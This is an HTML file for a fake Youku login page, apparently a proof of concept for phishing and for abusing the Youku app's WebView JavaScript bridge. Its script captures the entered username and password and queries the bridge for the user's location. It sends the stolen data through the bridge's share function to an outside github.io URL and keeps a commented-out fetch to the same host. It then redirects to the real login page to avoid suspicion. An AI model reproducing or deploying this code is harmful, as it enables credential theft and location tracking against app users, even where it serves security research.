<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>优酷视频 - 登录</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: linear-gradient(135deg, #0066cc 0%, #0055aa 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .login-box {
      background: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.2);
      width: 100%;
      max-width: 400px;
    }
    .logo {
      text-align: center;
      margin-bottom: 30px;
    }
    .logo h1 {
      color: #0066cc;
      font-size: 28px;
      font-weight: bold;
    }
    .logo p {
      color: #999;
      margin-top: 10px;
    }
    .form-group {
      margin-bottom: 20px;
    }
    .form-group label {
      display: block;
      color: #333;
      margin-bottom: 8px;
      font-weight: 500;
    }
    .form-group input {
      width: 100%;
      padding: 12px;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 16px;
      transition: border-color 0.3s;
    }
    .form-group input:focus {
      outline: none;
      border-color: #0066cc;
    }
    .submit-btn {
      width: 100%;
      padding: 14px;
      background: #0066cc;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }
    .submit-btn:hover {
      background: #0055aa;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      color: #999;
      font-size: 12px;
    }
    .loading {
      display: none;
      text-align: center;
      margin-top: 20px;
    }
    .loading.show {
      display: block;
    }
    .spinner {
      border: 3px solid #f3f3f3;
      border-top: 3px solid #0066cc;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .success {
      display: none;
      text-align: center;
      color: #00cc00;
      margin-top: 20px;
    }
    .success.show {
      display: block;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="logo">
      <h1>YOUKU</h1>
      <p>优酷视频 - 账号登录</p>
    </div>
     
    <form id="loginForm">
      <div class="form-group">
        <label for="username">手机号/邮箱</label>
        <input type="text" id="username" name="username" required 
            placeholder="请输入手机号或邮箱" autocomplete="off"/>
      </div>
       
      <div class="form-group">
        <label for="password">密码</label>
        <input type="password" id="password" name="password" required 
            placeholder="请输入密码" autocomplete="off"/>
      </div>
       
      <button type="submit" class="submit-btn">登录</button>
    </form>
     
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <p style="margin-top: 10px; color: #999;">登录中...</p>
    </div>
     
    <div class="success" id="success">
      <p>✅ 登录成功！</p>
      <p style="font-size: 12px; color: #999; margin-top: 5px;">正在跳转...</p>
    </div>
     
    <div class="footer">
      <p>protected by 优酷安全登录</p>
    </div>
  </div>
   
  <script>
    // 窃取凭证
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
       
      var username = document.getElementById('username').value;
      var password = document.getElementById('password').value;
       
      // 显示加载动画
      document.getElementById('loading').classList.add('show');
       
      // 显示捕获到凭证
      alert('[*] 捕获到凭证:\n用户名：' + username + '\n密码：' + password);
       
      // 尝试调用 YoukuJSBridge（如果在 WebView 中）
      if (typeof YoukuJSBridge !== 'undefined') {
        alert('[+] YoukuJSBridge 可用！');
         
        // 尝试获取地理位置
        try {
          var location = YoukuJSBridge.getGeolocation('{}');
          alert('[+] 获取到位置：' + location);
        } catch (err) {
          alert('[-] 位置获取失败：' + err);
        }
      }
       
      // 发送到攻击者服务器（模拟）
      setTimeout(function() {
        // 隐藏加载，显示成功
        document.getElementById('loading').classList.remove('show');
        document.getElementById('success').classList.add('show');
         
        // 构造窃取数据
        var stealData = {
          username: username,
          password: password,
          timestamp: Date.now(),
          userAgent: navigator.userAgent,
          url: window.location.href
        };
         
        // 尝试通过 JSBridge 发送
        if (typeof YoukuJSBridge !== 'undefined') {
          try {
            YoukuJSBridge.setShareInfo(JSON.stringify({
              title: '窃取成功',
              description: JSON.stringify(stealData),
              url: 'https://useryayagit.github.io/qinxuan/steal?data=' + encodeURIComponent(JSON.stringify(stealData))
            }));
            alert('[+] 数据已发送到：https://useryayagit.github.io/qinxuan/');
          } catch (err) {
            alert('[-] 发送失败：' + err);
          }
        }
         
        // 显示窃取成功
        alert('\n[+] 窃取成功！\n数据：' + JSON.stringify(stealData, null, 2));
         
        // 实际攻击中，这里会发送到攻击者服务器
        // fetch('https://useryayagit.github.io/qinxuan/steal', {
        //   method: 'POST',
        //   headers: { 'Content-Type': 'application/json' },
        //   body: JSON.stringify(stealData)
        // });
         
        // 3 秒后跳转到真实登录页（降低怀疑）
        setTimeout(function() {
          if (typeof YoukuJSBridge !== 'undefined') {
            try {
              YoukuJSBridge.loadUrl(JSON.stringify({
                url: 'https://www.youku.com/login'
              }));
            } catch (err) {}
          } else {
            window.location.href = 'https://www.youku.com/login';
          }
        }, 3000);
         
      }, 1500); // 模拟网络延迟
    });
     
    // 页面加载完成检测
    window.onload = function() {
      alert('[*] 页面加载完成\n[*] YoukuJSBridge 状态：' + (typeof YoukuJSBridge));
       
      if (typeof YoukuJSBridge !== 'undefined') {
        alert('[+] YoukuJSBridge 可用！\n[*] 可用方法：' + Object.keys(YoukuJSBridge).join(', '));
      } else {
        alert('[-] YoukuJSBridge 不可用');
      }
    };
  </script>
</body>
</html>
